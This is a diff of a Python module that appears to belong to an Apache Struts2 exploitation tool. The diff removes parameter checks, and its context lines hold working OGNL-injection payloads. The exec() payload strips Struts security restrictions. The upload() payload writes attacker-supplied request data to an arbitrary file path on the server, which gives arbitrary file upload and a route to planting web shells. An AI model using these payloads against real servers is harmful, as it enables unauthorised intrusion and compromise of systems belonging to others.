@@ -35,8 +35,6 @@ def prove(data):
 def exec(data=None):
     data = init(data, 'struts')
     if data['url'] != None:
-        if 'cmd' not in data.keys() :
-            raise Exception("None cmd ")
         cmd = data['cmd']
         exec_poc = '''%25%7b(%23test%3d%27multipart%2fform-data%27).(%23dm%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23_memberAccess%3f(%23_memberAccess%3d%23dm)%3a((%23container%3d%23context%5b%27com.opensymphony.xwork2.ActionContext.container%27%5d).(%23ognlUtil%3d%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.getExcludedPackageNames().clear()).(%23ognlUtil.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)))).(%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest()).(%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse()).(%23res.setContentType(%27text%2fhtml%3bcharset%3dUTF-8%27)).(%23res.getWriter().print(%27start%3astruts2_security_%27)).(%23res.getWriter().print(%27check%3aend%27)).(%23res.getWriter().flush()).(%23res.getWriter().close())%7d'''
         try:
@@ -55,10 +53,6 @@ def upload(data=None):
     data = init(data, 'struts')
     if data['url'] != None:
         upload_poc = '''%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#res.getWriter().print('start:')).(#fs=new java.io.FileOutputStream(%PATH%)).(#out=#res.getOutputStream()).(@org.apache.commons.io.IOUtils@copy(#req.getInputStream(),#fs)).(#fs.close()).(#out.print('oko')).(#out.print('kok/:end')).(#out.print(#req.getContextPath())).(#out.close())}'''
-        if 'srcpath' not in data.keys() :
-            raise Exception("None srcpath ")
-        if 'despath' not in data.keys() :
-            raise Exception("None despath ")
         despath = data['despath']
         content = _read_file(data['srcpath'])
         try:
